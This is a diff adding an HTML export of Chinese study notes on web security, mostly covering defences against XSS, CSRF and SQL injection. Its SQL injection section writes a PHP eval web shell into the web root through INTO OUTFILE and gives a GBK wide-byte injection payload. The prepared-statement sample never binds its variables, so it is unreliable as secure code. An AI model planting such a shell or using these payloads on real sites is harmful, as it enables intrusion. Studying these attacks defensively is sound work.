@@ -1,0 +1,703 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Web白帽</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-opaquegray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="777c5c19-9538-4fa8-b284-57a61cafc539" class="page sans"><header><div class="page-header-icon undefined"><span class="icon">🎩</span></div><h1 class="page-title">Web白帽</h1></header><div class="page-body"><p id="e118fc3e-8f52-4fa5-8c1c-64f2b9ff4920" class="">Secure By Default原則</p><p id="e4f0c039-e3d9-45a9-b908-66551921d3fa" class="">Defense in Depth原則</p><p id="cdcc5838-0d97-46bb-ae74-8053bd775be7" class="">
+</p><h1 id="8b6baa25-70c4-4366-8591-1479047c4cb2" class="">安全評估</h1><ul id="48fb5cbc-7d1e-4f26-88c5-1346e0703da7" class="bulleted-list"><li style="list-style-type:disc">資產等級劃分</li></ul><ul id="c811fbfe-ce79-4f00-974e-883ca35520b7" class="bulleted-list"><li style="list-style-type:disc">威脅分析<figure id="a7a93fce-59ac-4fab-b0a6-073fb981057f" class="link-to-page"><a href="Web%E7%99%BD%E5%B8%BD%20777c5c1995384fa8b28457a61cafc539/STRIDE%20a7a93fce59ac4fabb0a6073fb981057f.html"><span class="icon">🗂️</span>STRIDE</a></figure></li></ul><ul id="e46b3d69-e450-4860-a857-5ebe2b17fdea" class="bulleted-list"><li style="list-style-type:disc">風險分析<figure id="6323ef56-3b24-46d9-8f71-c16fc7d78e08" class="link-to-page"><a href="Web%E7%99%BD%E5%B8%BD%20777c5c1995384fa8b28457a61cafc539/DREAD%206323ef563b2446d98f71c16fc7d78e08.html"><span class="icon">📷</span>DREAD</a></figure></li></ul><ul id="a37dc6e0-4a00-4103-ba71-b499c88797e6" class="bulleted-list"><li style="list-style-type:disc">確認解決方案</li></ul><p id="6347cbe3-253a-4b0e-a1e0-fec34060e8ee" class="">前後端再輸入框各做一次檢查的意義，前端可以阻擋大部分使用者的操作失誤，節省伺服器的資源，後端檢查才是真正針對安全做防範，畢竟前端的檢查繞過非常輕鬆。</p><p id="6667d649-e270-40b5-b74c-2e6ee947f6ce" class="">
+</p><p id="f0adabc5-6d3f-4845-8447-b611bd8260b2" class="">window.name可以跨窗口發消息，實現消息傳遞，不受同源政策所限制。</p><p id="f06f9517-a5e6-4686-a498-35a1264c5b54" class="">
+</p><h2 id="06efe582-16e1-40e4-8873-f9fc7a3269f7" class="">XSS worm</h2><p id="433504ff-5464-4bb7-b678-b16c1e679b75" class="">81頁，目前較無能力吃透，往後有機會可以借鑑。</p><p id="3e98c829-d797-41cd-8a33-32d90f4bf887" class="">
+</p><h2 id="7fbe6680-6455-4251-b146-e77aa8438e90" class="">HttpOnly</h2><p id="09e15a23-21e6-4785-b988-c7183e1ee36b" class="">由瀏覽器掌控著，它能使cookie能不被javascript讀到，但也曾經出過被繞過的可能，Apache所支持的Trace請求，能夠將有HttpOnly屬性的Cookie讀出來</p><h2 id="3f8ba0f0-1443-47a6-aa01-8bc941fd8123" class="">輸出使用編碼</h2><p id="cf1ab487-2160-4d53-80fb-d3ec6039d6f9" class="">HtmlEncode，將字元轉換成HTMLEntities，對應標準是ISO-8859-1，對抗XSS，常用轉換的幾個字：</p><ul id="cd2c0fcb-9856-4426-b5e1-731a36d3d106" class="bulleted-list"><li style="list-style-type:disc">&amp; → &amp;amp;</li></ul><ul id="199accdc-4ed8-4889-95c5-ad78cbb346e4" class="bulleted-list"><li style="list-style-type:disc">&lt; → &amp;lt;</li></ul><ul id="53201c22-5cee-4c8f-873b-8a6cd17fa3c5" class="bulleted-list"><li style="list-style-type:disc">&gt; → &amp;gt;</li></ul><ul id="56c74ab3-2408-4f3a-b2ca-f75c47dea984" class="bulleted-list"><li style="list-style-type:disc">&quot;  → &amp;quot;</li></ul><ul id="996279b6-0604-49ac-847d-670b843c93a4" class="bulleted-list"><li style="list-style-type:disc">&#x27;   → &amp;#x27;</li></ul><ul id="8883da7e-32e7-4c1e-8552-490e59135955" class="bulleted-list"><li style="list-style-type:disc">/  → &amp;#x2F;</li></ul><p id="588a6701-0fb9-4f0c-bb22-89b5d435d20c" class=""><mark class="highlight-teal">Htmlparser 解析會優先於 Javascript Parser 執行，所以是HtmlEncode先被解碼，再解析Javascript Parser</mark></p><p id="d97a9d6b-30ed-4609-a5a7-4df9901cb29d" class="">OWASP ESAPI推薦一種更嚴格的HtmlEncode，除了字母數字，其他所有特殊字元都會編碼成HTMLEntites</p><pre id="c1d48884-5e87-4336-afdd-b60d64c87a6c" class="code"><code>String safe = ESAPI.encoder().encodeForHTMLAttribute(request.getParameter(&quot;input&quot;));</code></pre><p id="0794330d-b1aa-4b47-bea6-b659c3b73b5c" class="">
+</p><h2 id="f9645170-ec33-4b70-9342-cfedad177f4c" class="">CSRF防禦</h2><h3 id="2b446a80-355b-402a-a4bf-9ff32d3ce1b6" class="">驗證碼</h3><p id="4947df9e-a546-4595-ae62-c8b00cffa02f" class="">最為有效的方式，但容易被使用者詬病。</p><p id="5f9a5e3e-5673-4f00-8975-89b054099ff4" class="">
+</p><h3 id="d1c72cf5-b7f7-4b8c-b1c4-e9655d199072" class="">Referer Check</h3><p id="6f2797d6-4c81-4f3f-8e27-64aa0d930dee" class="">檢查來源來自哪裡，可以使用同源政策中的header Origin，還有referer，但須注意referer能夠偽造</p><p id="5ae9bfe6-7757-4969-867c-873e02be1f05" class="">Request:</p><pre id="98c0865a-ff09-47fe-aa61-3ddfa8c82461" class="code"><code>GET http://www.b.com/t.php HTTP/1.1
+Host: www.b.com
+...
+Referer: http://www.a.com/t.html
+Origin: http://www/a.com</code></pre><p id="8efdb241-bcaf-4c54-aabb-a760ff2408de" class="">Response:</p><pre id="46640204-ecad-4f24-93a2-48e3624395df" class="code"><code>HTTP/1.1 200 OK
+...
+Access-Control-Allow-Origin: *</code></pre><h3 id="9c50a5ce-a415-4748-8d0e-d387b5e55d76" class="">Token</h3><p id="3cd983eb-53dc-445d-9d72-dedec011354b" class="">使用Token做防禦，Token需同時放入表單與Session(Cookie)，再進行比對，若其中有一個為空，則為不合法，可能發生了CSRF。</p><h1 id="e8cdae15-7946-4906-aba5-c7c0c5181cfa" class="">SQL injection</h1><h2 id="962761f3-6682-49ef-be41-4f45f1d30717" class="">Timing Attack</h2><h3 id="69688360-5c9a-4682-b224-474e6c7d4513" class="">MySQL</h3><p id="0dfff967-d094-46e7-968c-95b3535b280e" class="">使用BENCHMARK()函數，讓同一個函數執行多次，透過返回時間長短來判定是否注入成功。</p><pre id="a6568345-75de-49a5-8511-e3b4b4891b33" class="code"><code>// BENCHMARK(count,expr)
+SELECT BENCHMARK(1000000,ENCODE(&#x27;hello&#x27;,&#x27;goodbye&#x27;))</code></pre><p id="e6803889-8627-4a7e-b16d-f7c7549821af" class="">其他語言也有類似函數，需查閱相關手冊。</p><h2 id="e60276a4-7357-476a-8906-ecde193ca9e1" class="">獲取關鍵資料</h2><p id="67da08eb-bfd2-4849-9802-dfe7706725d1" class="">透過一些SQL函數，可以取得很多有用訊息</p><ul id="796aea61-f360-4eb7-a75f-cc3c1403e46e" class="bulleted-list"><li style="list-style-type:disc">database() 當前資料庫名稱</li></ul><ul id="05821485-0a22-41c1-94ff-bbba4a93ca18" class="bulleted-list"><li style="list-style-type:disc">system_user()  系統帳戶</li></ul><ul id="b5a5e8ab-a0c2-48e3-829e-bd07838ef865" class="bulleted-list"><li style="list-style-type:disc">current_user()  當前帳戶</li></ul><ul id="d7fb7c97-2167-48ca-a8e3-9a20d6b21244" class="bulleted-list"><li style="list-style-type:disc">last_insert_id()  SQL語句插入最後一筆的ID</li></ul><p id="f9b11d12-d712-4239-9044-57fd3385c15e" class="">
+</p><p id="88902fcf-e469-4d8a-8513-00d85ee93f3d" class="">SQL也能傳Shell過去，先用指令檢視<mark class="highlight-teal">secure_file_priv</mark>，路徑若為空才能指定路徑上傳(NULL則為關閉)，若有預設路徑要注意</p><pre id="97b78c24-cc0b-4383-b967-763e04c057cc" class="code"><code>//檢視 secure_file_priv
+show global variables like &#x27;%secure%&#x27;;
+//寫一個後門資料表，轉成檔案匯出後，就可以考慮drop掉了
+CREATE TABLE shell(cmd text);
+INSERT INTO shell(cmd) VALUES(&#x27;&lt;?php @eval($_POST[CMD]); ?&gt;&#x27;);
+SELECT cmd from shell INTO OUTFILE &#x27;D:/php/www/shell.php&#x27;;</code></pre><p id="d0243c46-fbdf-4bce-a397-1e01df8743d2" class="">
+</p><h2 id="e2bb02f6-5210-4ce8-a237-25a768eb9870" class="">編碼問題</h2><p id="de948e61-a036-477f-b6e2-ff77ad76e13b" class="">當年MySQL的 <code>mysql_real_escape_string()</code>函式出現過此問題，編碼不一致可能產生SQLi，例如當MySQL使用GBK編碼</p><ul id="6591a56e-a9eb-42ed-a47e-8ae6e52dfb2b" class="bulleted-list"><li style="list-style-type:disc">0x5c = &#x27; <mark class="highlight-teal">\</mark> &#x27;</li></ul><ul id="02fd2a25-b27b-4a97-a53a-1ae6e6b96d2d" class="bulleted-list"><li style="list-style-type:disc">0x27 = &#x27; <mark class="highlight-teal">&#x27; </mark>&#x27;</li></ul><p id="0c9d9839-b95f-4bb8-ba5f-937bfa51557b" class="">0xbf27 、 0xbf5c 則是兩個合法的GBK編碼，因此</p><pre id="477e0b31-72b9-4db6-aa4c-5a954815ab78" class="code"><code>0xbf27 or 1=1;#</code></pre><p id="c60075fc-8bd9-4591-a3f0-19b11bfa703a" class="">如果使用反斜線註釋掉0x27的單引號，這時就會發生問題，最後的結果會變為</p><blockquote id="a30983ef-d2cf-4b80-8c7d-a0cb8eab8c65" class="">0xbf5c 0x27 or 1=1;#</blockquote><p id="9c497119-f3b5-41eb-9f3a-e5ebc22a2b2d" class="">
+</p><h2 id="417fd3ef-3ee0-4eb6-b359-59db451193ce" class="">SQL Column Trucation</h2><p id="4c26cf81-0ccf-4ee8-b784-b17351a37611" class="">2008年有一個MySQL截斷漏洞，sql_mode為default時，沒有開啟STRICT_ALL_TABLES，惡意輸入超長值會跳出警告，但能夠存入這一筆資料並截斷後面的值，可能做到資料庫裡出現</p><pre id="1c128c92-ca4f-40b2-bad1-9a956c16208f" class="code"><code>admin | pass
+admin | new_pass</code></pre><p id="3df3ecb9-6002-468b-b1a4-577bd01f1fb2" class="">而這時如果做出某些操作，可能發生一些越權訪問，例如簡單的</p><pre id="1fea3bf3-72b4-4144-bf6f-bdb151e6b7f5" class="code"><code>select `username` from `users` </code></pre><p id="d359c392-70f4-4aa8-ad43-48a8434e264e" class="">
+</p><h2 id="1661787d-eeb7-43ea-89cf-4e9fb2a9edb3" class="">使用預處理器來防SQLi</h2><p id="8c335481-1c0e-4141-a4e6-92bdc89fc91c" class="">用綁定變數來<mark class="highlight-teal">防止SQL語法的結構改變</mark>，下面是php的預處理器綁定變數範例</p><pre id="90eb4a5b-03c3-4c5b-b0e8-6ddbdacd46c3" class="code"><code>$query = &quot;INSERT INTO myCity (Name ,CountryCode,District) VALUES (?,?,?)&quot;;
+$stmt = $mysqli -&gt; prepare($query);
+$val1 = &#x27;Stuttgart&#x27;;
+$val2 = &#x27;DEU&#x27;;
+$val3 = &#x27;Baden-Wuerttemberg&#x27;;
+
+$stmt -&gt; execute();
+</code></pre><p id="9b075e95-1f5e-4304-b62f-39bb37f15944" class="">
+</p><p id="10435c06-647c-48fb-86e7-480080e29fe4" class="">
+</p><h2 id="3e34f2d2-a651-406c-9a39-68be0fdb1f36" class="">CRLF Attack</h2><p id="4ac9d7d6-778a-4295-9035-9ff179909a2c" class="">換行、回車問題，就是<code>\r\n</code>，在windows操作系統底下的換行都是如此，他們的編碼分別為<code>%0d%0a</code>，防禦的話只需要對這兩個字元做特別處理，常見可能發生的地方在於log檔的偽造、偽裝構造Http header</p><p id="7fe49ab6-9791-416f-bf43-83e9be424ddc" class="">
+</p><h2 id="74ea9006-3d96-4ee1-aa63-9cc6476cfb71" class="">OAuth</h2><p id="1f7170d3-42b7-431f-bc2b-fb818fbf7c16" class="">Request token 換取Access token，然後透過Access token訪問資源，Request token只是用來換取用戶的授權</p><p id="7cb6c5a3-3751-4d65-8011-96b99ede9ce9" class="">
+</p></div></article></body></html>
